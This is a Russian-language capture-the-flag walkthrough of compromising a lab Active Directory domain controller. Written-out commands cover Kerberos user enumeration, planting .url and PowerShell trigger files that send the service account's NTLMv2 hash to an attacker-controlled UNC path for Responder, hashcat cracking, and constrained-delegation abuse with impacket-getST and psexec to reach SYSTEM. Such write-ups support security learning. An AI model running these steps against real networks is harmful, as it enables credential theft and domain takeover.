# Proxy

### Необходимые навыки

- Перечисление Active Directory: BloodHound, `enum4linux-ng`, `kerbrute`, `nxc` (NetExec)
- Работа с Kerberos: понимание механизмов AS-REP Roasting, Kerberoasting и **ограниченного делегирования (Constrained Delegation)**
- Захват NetNTLMv2-хэша через поддельные файлы-триггеры (`.url` / `.ps1`) и Responder
- Работа с `impacket`: `getST`, `psexec`

---

### Перечисление и разведка

Начинаем со сканирования портов:

```bash
rustscan --ulimit 5000 --range 0-65535 -a <IP-цели> -- -O -sC -sV -oX proxy.xml
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-08 11:53:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
...
```

Имя компьютера `DC01.ctf.local` и характерный набор портов (53, 88, 389, 445, 3268) однозначно указывают на Контроллер Домена (Domain Controller).
Попытка выгрузить зону DNS (`dig axfr @<IP-цели> ctf.local`) показывает, что в домене зарегистрирован только сам DC.

Запускаем расширенное перечисление через `enum4linux-ng`:
```bash
enum4linux-ng -A <IP-цели> -oA enum_proxy.txt
```
Хотя нулевая сессия (Null Session) RPC частично доступна, критические команды (вроде `enumdomuser`) возвращают `NT_STATUS_ACCESS_DENIED`. Брутфорс RID через SMB (`nxc smb <IP> -u '' -p '' --rid-brute 2000`) и анонимное перечисление LDAP также терпят неудачу.

#### Энумерация пользователей через Kerberos

Так как анонимный SMB/LDAP закрыт, используем `kerbrute` для перебора валидных имен пользователей через механизмы Kerberos (запросы AS-REQ):

```bash
kerbrute userenum --dc <IP-цели> -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2026/07/08 15:43:16 >  [+] VALID USERNAME:       guest@ctf.local
2026/07/08 15:43:16 >  [+] VALID USERNAME:       administrator@ctf.local
```

Проверяем гостевую учетную запись через NetExec (`nxc`): 
```bash
nxc smb <IP-цели> -u guest -p ''
```
Учётная запись `guest` активна и не требует пароля. 

*(Примечание: Атаки AS-REP Roasting и Kerberoasting на данном этапе не применимы: для AS-REP Roasting у администратора не установлен флаг `DONT_REQ_PREAUTH`, а для Kerberoasting у пользователя `guest` недостаточно прав для выполнения LDAP-запросов на получение SPN).*

#### Анализ SMB-шар

Проверяем доступные сетевые папки от имени гостя:

```bash
smbmap -H <IP-цели> -u 'guest' -p ''
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT-Shared                                               READ, WRITE     IT Department Shared Resources
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

Обнаружена нестандартная директория `IT-Shared` с правами на запись (WRITE). Подключаемся через `smbclient`:
```bash
smbclient //10.112.x.x/IT-Shared -U 'ctf.local\guest%'
```
Внутри находим текстовый файл `IT-Onboarding-Checklist.txt`, содержащий несколько паролей (вероятно, устаревших) и описание служебного процесса:

```text
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.
```

Распыление найденных паролей (Password Spraying) не дало результатов. Однако информация о службе `svc.scanner` — это прямой вектор атаки.

---

### Захват хэша (LLMNR/NBT-NS Poisoning & SMB Relay/Capture)

Служба каждые 2 минуты сканирует директорию `IT-Shared` и извлекает метаданные/иконки файлов. Это классический сценарий для захвата хэша NetNTLMv2. Если мы подложим файл, который попытается загрузить ресурс (иконку) с нашей атакующей машины, служба `svc.scanner` автоматически отправит нам свои учетные данные в попытке аутентификации.

Подготавливаем слушатель `Responder`:
```bash
sudo responder -I tun0
```

Сначала создаем классический файл-приманку (`.url` ярлык):
```bash
cat > @Shortcut.url << 'END_OF_URL'
[InternetShortcut]
URL=http://ctf.local
WorkingDirectory=ctf
IconFile=\\<IP-атакующего>\icons\icon.ico
IconIndex=1
END_OF_URL
```
Загружаем его в `IT-Shared` (`put @Shortcut.url`). Хэш не приходит — вероятно, механизм "Shell enumeration" на целевой машине не загружает удаленные иконки для ярлыков.

Меняем тактику. Вместо ярлыка загружаем PowerShell-скрипт, при обработке которого сканер может триггернуть сетевое обращение:
```bash
echo 'Test-Path \\<IP-атакующего>\icons\icon.ico' > trigger.ps1
```

Метод срабатывает. Responder перехватывает аутентификацию службы:
```text
[SMB] NTLMv2-SSP Hash : svc.scanner::CTF:3e5e...
```

Взламываем полученный хэш локально с помощью `hashcat`:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
Пароль успешно восстановлен. Проверка показывает, что у пользователя `svc.scanner` нет прямых прав на подключение через WinRM, RDP или psexec. Требуется дальнейшая эскалация привилегий в рамках Active Directory.

---

### Эксплуатация ограниченного делегирования (Constrained Delegation)

Используя полученные учетные данные `svc.scanner`, собираем структуру Active Directory с помощью `BloodHound`:

```bash
bloodhound-python -u svc.scanner -p '<СЕКРЕТНЫЙ_ПАРОЛЬ>' -d ctf.local -ns <IP-цели> -c All --zip
./bloodhound-cli containers start
```

Импортируем данные в BloodHound и анализируем кратчайший путь до `Domain Admins` / `Administrator`:

<img width="1627" height="450" alt="image" src="https://github.com/user-attachments/assets/242ae21d-f168-4fe1-b152-a0e6a98a4efa" />

Граф выявляет критическую уязвимость:
- Учетная запись `svc.scanner` имеет привилегию **AllowedToDelegate** на контроллер домена `DC01`. 
- Это означает, что в домене настроено *Ограниченное делегирование (Constrained Delegation)*. Учетная запись `svc.scanner` может использовать расширение протокола Kerberos (S4U2Proxy), чтобы запросить Service Ticket (TGS) от имени *любого пользователя* (в том числе Administrator) к службе на `DC01`.

#### Процесс эксплуатации (через S4U2Proxy)

1. Обновляем `/etc/hosts` для корректного разрешения имен Kerberos:
```bash
echo "<IP-цели> dc01.ctf.local dc01" | sudo tee -a /etc/hosts
```

2. Запрашиваем Service Ticket (TGS) от имени `Administrator` к службе `cifs` на `dc01.ctf.local`, используя учетные данные `svc.scanner`. Инструмент `impacket-getST` автоматически проведет S4U2Self (получение билета для себя от имени админа) и S4U2Proxy (конвертация этого билета в билет для доступа к целевой службе):
```bash
impacket-getST ctf.local/svc.scanner:'<СЕКРЕТНЫЙ_ПАРОЛЬ>' -spn cifs/dc01.ctf.local -impersonate Administrator -dc-ip <IP-цели>
```

3. Экспортируем полученный билет в переменную окружения, чтобы `impacket` мог использовать его для аутентификации (Pass-the-Ticket):
```bash
export KRB5CCNAME=Administrator@cifs_dc01.ctf.local@CTF.LOCAL.ccache
```

4. Подключаемся к контроллеру домена через `psexec`, используя только билет Kerberos (`-k -no-pass`):
```bash
impacket-psexec -k -no-pass dc01.ctf.local
```

Мы получаем `NT AUTHORITY\SYSTEM` оболочку на контроллере домена.

Забираем финальный флаг:
```cmd
type C:\Users\Administrator\Desktop\flag.txt
```
Машина успешно пройдена.
